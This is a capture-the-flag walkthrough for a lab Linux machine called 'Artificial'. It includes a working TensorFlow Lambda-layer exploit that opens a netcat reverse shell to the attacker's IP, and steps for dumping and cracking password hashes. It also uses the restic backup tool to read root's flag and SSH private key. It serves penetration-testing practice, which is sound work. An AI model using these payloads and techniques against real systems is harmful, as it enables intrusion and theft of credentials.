## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Its an Linux machine 
```

## Run RustScan
```bash
rustscan -a 10.10.11.74 -b 450 -t 2000 --ulimit 5000 -- -e -Pn   
Open ports, closed hearts.

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.74:22
Open 10.10.11.74:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -e -Pn" on ip 10.10.11.74
Depending on the complexity of the script, results may take some time to appear.
[!] Error Exit code = 1
```

### Got the Ports Now Lets Surf on Web
Before surf lets add ip in /etc/hosts
```bash
echo "10.10.11.74 artificial.htb" >> /etc/hosts
```
Now Surf the content of the webpage 
```html 

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Artificial - AI Solutions</title>
    <link rel="stylesheet" href="/static/css/styles.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            line-height: 1.6;
        }
        .code-example-section {
            margin: 40px 0;
            padding: 20px;
            border-radius: 8px;
            background: linear-gradient(to right, #f9f9f9, #e6e6e6);
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        .code-example-section h2 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #333;
        }
        pre {
            background-color: #282c34;
            color: #abb2bf;
            border-radius: 8px;
            padding: 20px;
            overflow: auto;
            font-size: 16px;
            line-height: 1.5;
            margin: 0;
        }
        code {
            color: #e06c75;
        }
        .keyword {
            color: #c678dd;
        }
        .comment {
            color: #7f8c8d;
        }
        .string {
            color: #98c379;
        }
        .number {
            color: #d19a66;
        }
    </style>
</head>
<body>

    <!-- Header -->
    <header>
        <h1>Artificial</h1>
        <p>Empowering AI for the Future</p>
        <nav>
            <ul>
                <li><a href="#about">Why Artificial</a></li>
                <li><a href="#reviews">Reviews</a></li>
                <li><a href="/login">Login</a></li>
                <li><a href="/register">Register</a></li>
            </ul>
        </nav>
    </header>

    <!-- Hero Section -->
    <section class="hero-section">
        <h2>Revolutionize Your AI Experience</h2>
        <p>Build, test, and deploy AI models effortlessly with Artificial.</p>
        <a href="/register" class="cta-btn">Get Started</a>
    </section>

    <!-- Why Artificial Section -->
    <section id="about" class="about-section">
        <h2>Why Use Artificial?</h2>
        <p>Artificial offers state-of-the-art AI model building, testing, and deployment with a user-friendly interface. Whether you're a researcher, developer, or AI enthusiast, Artificial provides the tools and platform to innovate and experiment with cutting-edge AI technologies.</p>
        <ul>
            <li>Effortless AI model creation</li>
            <li>Real-time testing and validation</li>
            <li>Seamless deployment to production</li>
        </ul>
        <h3>Predict Future Sales with AI</h3>
        <p>Artificial helps you forecast future sales using advanced AI models. By analyzing historical sales data, our platform predicts which months will see the highest sales. With intuitive tools and seamless interfaces, you can easily visualize these predictions and optimize your sales strategies.</p>
    </section>

    <!-- Code Example Section -->
    <section id="code-example" class="code-example-section">
        <h2>Example Code:</h2>
        <pre><code>
<span class="keyword">import</span> numpy <span class="keyword">as</span> np
<span class="keyword">import</span> pandas <span class="keyword">as</span> pd
<span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf
<span class="keyword">from</span> tensorflow <span class="keyword">import</span> keras
<span class="keyword">from</span> tensorflow.keras <span class="keyword">import</span> layers

np.random.seed(42)

<span class="comment"># Create hourly data for a week</span>
hours = np.arange(0, 24 * 7)
profits = np.random.rand(len(hours)) * 100

<span class="comment"># Create a DataFrame</span>
data = pd.DataFrame({
    <span class="string">'hour'</span>: hours,
    <span class="string">'profit'</span>: profits
})

X = data['hour'].values.reshape(-1, 1)
y = data['profit'].values

<span class="comment"># Build the model</span>
model = keras.Sequential([
    layers.Dense(64, activation='relu', input_shape=(1,)),
    layers.Dense(64, activation='relu'),
    layers.Dense(1)
])

<span class="comment"># Compile the model</span>
model.compile(optimizer='adam', loss='mean_squared_error')

<span class="comment"># Train the model</span>
model.fit(X, y, epochs=100, verbose=1)

<span class="comment"># Save the model</span>
model.save(<span class="string">'profits_model.h5'</span>)

        </code></pre>
    </section>

    <!-- Reviews Section -->
    <section id="reviews" class="reviews-section">
        <h2>What Our Users Say</h2>

        <div class="review">
            <h3>John Doe</h3>
            <p>"Artificial is simply amazing! It makes AI model testing so intuitive."</p>
        </div>

        <div class="review">
            <h3>Jane Smith</h3>
            <p>"I can now build and deploy AI models faster than ever. Highly recommend Artificial!"</p>
        </div>

        <div class="review">
            <h3>Michael Lee</h3>
            <p>"Artificial has completely transformed how we experiment with AI in our lab. Great platform!"</p>
        </div>
    </section>

    <br><br><br><br><br>
    <!-- Footer -->
    <footer class="footer">
        <p>&copy; 2024 Artificial. All Rights Reserved.</p>
    </footer>

    <script src="/static/js/scripts.js"></script>
</body>
</html>
```

Then I downgrade my python version from python3.13.2 to python3.8.13 to get used tensorflow using chatgpt obviously
then I used reverse-shell exploit from Github
```Github_repo
https://github.com/Splinter0/tensorflow-rce/blob/main/exploit.py
```
after that which exploit it actually used is 
```python 
import tensorflow as tf

def exploit(x):
    import os
    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.59 6666 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

Then I run
```bash
python3.8 exploit.py
```
this creates a new file `exploit.h5`
then I upload it on the Website and clicked view and got the reverse-shell

```bash
$ nc -lvnp 6666
listening on [any] 6666 ...
connect to [10.10.16.59] from (UNKNOWN) [10.10.11.74] 49008
/bin/sh: 0: can't access tty; job control turned off
$ ls
app.py
instance
models
__pycache__
static
templates
$ ls -la
total 36
drwxrwxr-x 7 app app 4096 Jun  9 13:56 .
drwxr-x--- 6 app app 4096 Jun  9 10:52 ..
-rw-rw-r-- 1 app app 7846 Jun  9 13:54 app.py
drwxr-xr-x 2 app app 4096 Aug  2 21:51 instance
drwxrwxr-x 2 app app 4096 Aug  2 21:51 models
drwxr-xr-x 2 app app 4096 Jun  9 13:55 __pycache__
drwxrwxr-x 4 app app 4096 Jun  9 13:57 static
drwxrwxr-x 2 app app 4096 Jun 18 13:21 templates
$ cd ..
$ ls -la
total 36
drwxr-x--- 6 app  app  4096 Jun  9 10:52 .
drwxr-xr-x 4 root root 4096 Jun 18 13:19 ..
drwxrwxr-x 7 app  app  4096 Jun  9 13:56 app
lrwxrwxrwx 1 root root    9 Oct 19  2024 .bash_history -> /dev/null
-rw-r--r-- 1 app  app   220 Sep  7  2024 .bash_logout
-rw-r--r-- 1 app  app  3771 Sep  7  2024 .bashrc
drwxrwxr-x 3 app  app  4096 Sep  8  2024 .config
drwxrwxr-x 2 app  app  4096 Sep  8  2024 .keras
drwxrwxr-x 6 app  app  4096 Sep 12  2024 .local
-rw-r--r-- 1 app  app   807 Sep  7  2024 .profile
lrwxrwxrwx 1 root root    9 Oct 19  2024 .python_history -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 19  2024 .sqlite_history -> /dev/null
```

this allow us to think of `sqlite` so I searched its database 
```bash
find / -type f \( -iname "*.db" -o -iname "*.sqlite" \) 2>/dev/null
```
And Got the top file which is 
```bash
find / -type f \( -iname "*.db" -o -iname "*.sqlite" \) 2>/dev/null
/home/app/app/instance/users.db
/usr/lib/firmware/regulatory.db
```
This First File is in the app Directory which allow us to visit it and got something
```bash
$ sqlite3 /home/app/app/instance/users.db
.table;
Error: unknown command or invalid arguments:  "table;". Enter ".help" for help
.tables
model  user 
.schema user
CREATE TABLE user (
        id INTEGER NOT NULL, 
        username VARCHAR(100) NOT NULL, 
        email VARCHAR(120) NOT NULL, 
        password VARCHAR(200) NOT NULL, 
        PRIMARY KEY (id), 
        UNIQUE (username), 
        UNIQUE (email)
);
select *from user;
1|gael|gael@artificial.htb|[hash omitted]
2|mark|mark@artificial.htb|[hash omitted]
3|robert|robert@artificial.htb|[hash omitted]
4|royer|royer@artificial.htb|[hash omitted]
5|mary|mary@artificial.htb|[hash omitted]
6|a|a@a|[hash omitted]
7|teste|teste@teste.com|[hash omitted]
8|hugo|hugo@hugo.com|[hash omitted]
9|test|test@gmail.com|[hash omitted]
10|admin|test@test.com|[hash omitted]
11|Tester|Test@htb|[hash omitted]
12|admi|admin@htb|[hash omitted]
13|asdasd|asdasd@g|[hash omitted]
14|test123|test@test|[hash omitted]
15|watche|watche@watche.com|[hash omitted]
16|malume|malume@gmail.com|[hash omitted]
17|notname00|nameo00@name.net|[hash omitted]
18|obito|obito@artificial.htb|[hash omitted]
19|aaa@gmail.com|aaa@gmail.com|[hash omitted]
20|teste2|teste2@teste.com|[hash omitted]
21|testuser|testuser@htb|[hash omitted]
22|root|root@root.com|[hash omitted]
```

And From Crackstation.net we found this 
```bash
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8 
```
Password for gael is `[password omitted]`
```Credentials
gael : [password omitted]
```
and after login using ssh we found the user.txt which is the user flag
```bash
gael@artificial:~$ ls
user.txt
gael@artificial:~$ cat user.txt
[flag omitted]
```
User Flag 
```user_flag
[flag omitted]
```

Then after looking for SUID and Writable files we got this 
```bash
find /home/ -type f -writable 2>/dev/null 
/home/gael/.profile
/home/gael/.bash_logout
/home/gael/.ssh/known_hosts
/home/gael/.ssh/authorized_keys.save
/home/gael/.ssh/authorized_keys
/home/gael/.gnupg/trustdb.gpg
/home/gael/.gnupg/pubring.kbx
/home/gael/.bashrc
/home/gael/.cache/restic/ab6fe1f12b6169e99ecda9991ff87d6ff16b0324aa239402710ffd2e0a0976b5/index/b5/b54abe7bc467118ee03acf80d9615627cec1c0749c9865df25efa163a5d54d99
/home/gael/.cache/restic/ab6fe1f12b6169e99ecda9991ff87d6ff16b0324aa239402710ffd2e0a0976b5/version
/home/gael/.cache/restic/ab6fe1f12b6169e99ecda9991ff87d6ff16b0324aa239402710ffd2e0a0976b5/data/85/85bda25cd6eea1d7556a3476d5585cb7e22af954ea0a9170a5052f71fb79f6d1
/home/gael/.cache/restic/ab6fe1f12b6169e99ecda9991ff87d6ff16b0324aa239402710ffd2e0a0976b5/snapshots/f4/f4778464ff94baff59c2d983598c4dedc5be474311161e64759367ac506764e7
/home/gael/.cache/restic/CACHEDIR.TAG
/home/gael/.cache/motd.legal-displayed
/home/gael/.local/share/backrest/oplog.sqlite.lock
/home/gael/.local/share/backrest/tasklogs/logs.sqlite
/home/gael/.local/share/backrest/oplog.sqlite
/home/gael/.local/share/backrest/install.lock
/home/gael/.local/share/backrest/jwt-secret
/home/gael/.local/share/backrest/processlogs/backrest.log
```
we got hint about backrest then we google it we got github repo which told us 
```imp. version: "3.8"
services:
  backrest:
    image: garethgeorge/backrest:latest
    container_name: backrest
    hostname: backrest
    volumes:
      - ./backrest/data:/data
      - ./backrest/config:/config
      - ./backrest/cache:/cache
      - ./backrest/tmp:/tmp
      - ./backrest/rclone:/root/.config/rclone # Mount for rclone config (needed when using rclone remotes)
      - /path/to/backup/data:/userdata  # Mount local paths to backup
      - /path/to/local/repos:/repos     # Mount local repos (optional for remote storage)
    environment:
      - BACKREST_DATA=/data
      - BACKREST_CONFIG=/config/config.json
      - XDG_CACHE_HOME=/cache
      - TMPDIR=/tmp
      - TZ=America/Los_Angeles
    ports:
      - "9898:9898"
    restart: unless-stopped
```
that some service is running on port 9898
which confirm by 
```bash
$ ss -tuln | grep 9898
tcp    LISTEN  0       4096         127.0.0.1:9898        0.0.0.0:*   
```
this tells us that port 9898 is listening locally
then  we look for backrest file is any present 
```bash
find / -iname "*backrest*" 2>/dev/null
/home/gael/.local/share/backrest
/home/gael/.local/share/backrest/processlogs/backrest.log
/usr/local/bin/backrest
/opt/backrest
/opt/backrest/.config/backrest
/opt/backrest/backrest
/opt/backrest/processlogs/backrest.log
/var/backups/backrest_backup.tar.gz
```
we found these files where in directory opt we dong have access to get the config file info so we checked the `/var/backups/backrest_backup.tar.gz`
Got the result that we cant unzip it cause it is owned by root but it can access by group `sysadm ` which is user gael actually is so we do 
```bash
cp /var/backups/backrest_backup.tar.gz /tmp/
cd /tmp
tar -xvf backrest_backup.tar.gz
```
and then we access the content inside the file
```bash
tar -xvf backrest_backup.tar.gz
backrest/
backrest/restic
backrest/oplog.sqlite-wal
backrest/oplog.sqlite-shm
backrest/.config/
backrest/.config/backrest/
backrest/.config/backrest/config.json
backrest/oplog.sqlite.lock
backrest/backrest
backrest/tasklogs/
backrest/tasklogs/logs.sqlite-shm
backrest/tasklogs/.inprogress/
backrest/tasklogs/logs.sqlite-wal
backrest/tasklogs/logs.sqlite
backrest/oplog.sqlite
backrest/jwt-secret
backrest/processlogs/
backrest/processlogs/backrest.log
backrest/install.sh
gael@artificial:/tmp$ cd backrest/
gael@artificial:/tmp/backrest$ ls -la
total 51092
drwxr-xr-x  5 gael gael     4096 Mar  4 22:17 .
drwxrwxrwt 13 root root     4096 Aug  2 22:41 ..
-rwxr-xr-x  1 gael gael 25690264 Feb 16 19:38 backrest
drwxr-xr-x  3 gael gael     4096 Mar  3 21:27 .config
-rwxr-xr-x  1 gael gael     3025 Mar  3 04:28 install.sh
-rw-------  1 gael gael       64 Mar  3 21:18 jwt-secret
-rw-r--r--  1 gael gael    57344 Mar  4 22:13 oplog.sqlite
-rw-------  1 gael gael        0 Mar  3 21:18 oplog.sqlite.lock
-rw-r--r--  1 gael gael    32768 Mar  4 22:17 oplog.sqlite-shm
-rw-r--r--  1 gael gael        0 Mar  4 22:17 oplog.sqlite-wal
drwxr-xr-x  2 gael gael     4096 Mar  3 21:18 processlogs
-rwxr-xr-x  1 gael gael 26501272 Mar  3 04:28 restic
drwxr-xr-x  3 gael gael     4096 Mar  4 22:17 tasklogs
gael@artificial:/tmp/backrest$ cd .config/
gael@artificial:/tmp/backrest/.config$ ls
backrest
gael@artificial:/tmp/backrest/.config$ cd backrest/
gael@artificial:/tmp/backrest/.config/backrest$ ls
config.json
gael@artificial:/tmp/backrest/.config/backrest$ cat config.json 
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "[hash omitted]"
      }
    ]
  }
}
gael@artificial:/tmp/backrest/.config/backrest$ 
```
we got hash
which is 
```hash
[hash omitted]
```
this hash is in base64 so first decrypt it 
```bash
└─$ base64 -d hash.txt > output.txt
```

then we decrypt it by john 
```bash
john output.txt -w /usr/share/wordlists/rockyou.txt 
[password omitted]
```

credentials 
```credentials
backrest_root : [password omitted]
```
using this credentials we log in and got a page like github which connected to the local host as root
where can first need to setup or create an repo with option
```options
repo_name = test
repo uri = test
password 1234
and submit
```
then run command 
help
```bash
command: /opt/backrest/restic help -o sftp.args=-oBatchMode=yes
restic is a backup program which allows saving multiple revisions of files and
directories in an encrypted repository stored on different backends.
The full documentation can be found at https://restic.readthedocs.io/ .
Usage:
  restic [command]
Available Commands:
  backup        Create a new backup of files and/or directories
  cache         Operate on local cache directories
  cat           Print internal objects to stdout
  check         Check the repository for errors
  copy          Copy snapshots from one repository to another
  diff          Show differences between two snapshots
  dump          Print a backed-up file to stdout
  find          Find a file, a directory or restic IDs
  forget        Remove snapshots from the repository
  init          Initialize a new repository
  key           Manage keys (passwords)
  list          List objects in the repository
  ls            List files in a snapshot
  migrate       Apply migrations
  mount         Mount the repository
  prune         Remove unneeded data from the repository
  recover       Recover data from the repository not referenced by snapshots
  repair        Repair the repository
  restore       Extract the data from a snapshot
  rewrite       Rewrite snapshots to exclude unwanted files
  snapshots     List all snapshots
  stats         Scan the repository and show basic statistics
  tag           Modify tags on snapshots
  unlock        Remove locks other processes created
```

then run the backup command to backup the root directory
```bash
command: /opt/backrest/restic backup /root -o sftp.args=-oBatchMode=yes
using parent snapshot 1eb2c0d3
Files:           0 new,     0 changed,    30 unmodified
Dirs:            0 new,     0 changed,    48 unmodified
Added to the repository: 0 B   (0 B   stored)
processed 30 files, 4.299 MiB in 0:00
snapshot d318d84d saved
```
then we just need to dump the latest backup where file is /root/root.txt
## BOOM 
Got the Root Flag 
```bash
command: /opt/backrest/restic dump latest /root/root.txt -o sftp.args=-oBatchMode=yes
[flag omitted]
```

there is also one more way to gain access to the room 
by first run the backup of root directory its in the web interface
```bash
command: /opt/backrest/restic backup /root -o sftp.args=-oBatchMode=yes
using parent snapshot d778f4d5
Files:           0 new,     0 changed,    30 unmodified
Dirs:            0 new,     0 changed,    48 unmodified
Added to the repository: 0 B   (0 B   stored)
processed 30 files, 4.299 MiB in 0:00
snapshot 3aee0c5a saved
```
then run 
```bash
command: /opt/backrest/restic ls 3aee0c5a -o sftp.args=-oBatchMode=yes
snapshot 3aee0c5a of [/root] at 2025-08-02 23:42:02.115184699 +0000 UTC by root@artificial filtered by []:
/root
/root/.bash_history
/root/.bashrc
/root/.cache
/root/root.txt
/root/.ssh/id_rsa
```
then 
```bash
command: /opt/backrest/restic dump 3aee0c5a /root/.ssh/id_rsa -o sftp.args=-oBatchMode=yes
-----BEGIN OPENSSH PRIVATE KEY-----
[private key omitted]
-----END OPENSSH PRIVATE KEY-----
```
And got the rsa key then in terminal save rsa key as id_rsa and with permission 600
```bash
$ nano id_rsa
$ chmod 600 id_rsa
$ ssh -i id_rsa root@10.10.11.74
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat 02 Aug 2025 11:40:21 PM UTC
root@artificial:~# whoami
root
root@artificial:~# pwd
/root
root@artificial:~# ls
root.txt  scripts
root@artificial:~# cat root.txt
[flag omitted]
```

Root Flag
```flag
[flag omitted]
```
# END
